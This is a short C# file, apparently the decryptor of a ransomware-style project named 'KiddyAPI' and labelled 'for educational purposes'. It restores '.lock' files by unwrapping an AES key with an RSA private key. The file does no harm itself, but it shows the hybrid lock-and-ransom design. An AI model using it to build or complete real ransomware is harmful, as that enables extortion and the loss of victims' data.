/////////////////////////////////////////////////////////
//// Developer : Whiro
//// For for educational purposes
//////////////////////////////////////////////////////////

using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace KiddyAPI.Crypt
{
    public class Decrypt
    {
        public static void DecryptFile(string file)
        {
            if (!File.Exists("private.txt"))
            {
                MessageBox.Show("You need Private.txt");
            }
            else
            {
                byte[] bytesToBeDecrypted = File.ReadAllBytes(file + ".lock");
                byte[] decryptedBytes = null;
                var rsa = new RSACryptoServiceProvider(2048);
                rsa.FromXmlString(File.ReadAllText("private.txt"));
                byte[] key = rsa.Decrypt(File.ReadAllBytes("aes.txt"), false);
                decryptedBytes = Handler.Decrypt(bytesToBeDecrypted, key);
                File.WriteAllBytes(file,decryptedBytes);
                //string ext = Path.GetExtension(file + ".lock");
                //string result = file.Substring(file.Length - ext.Length);
                //File.Move(file, result);
            }
        }
    }
}
